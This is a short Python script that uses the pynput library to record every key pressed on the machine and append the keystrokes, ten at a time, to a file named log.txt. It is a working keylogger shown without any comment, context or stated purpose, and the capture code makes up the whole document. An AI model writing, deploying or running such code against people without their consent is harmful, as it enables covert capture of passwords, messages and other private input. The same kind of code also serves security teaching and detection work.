from pynput.keyboard import Key, Listener
count=0
keys=[]

def write(keys):
    with open("log.txt","a") as f:
        for key in keys:
            k=str(key).replace("'","")
            if "space" in k:
                k=" "
            elif "back" in k:
                k="{back}"
            f.write(k)

def on_press(key):
    global keys,count
    keys.append(key)
    count+=1
    if count >=10:
        write(keys)
        keys=[]
        count=0

with Listener(on_press=on_press) as l:
    l.join()
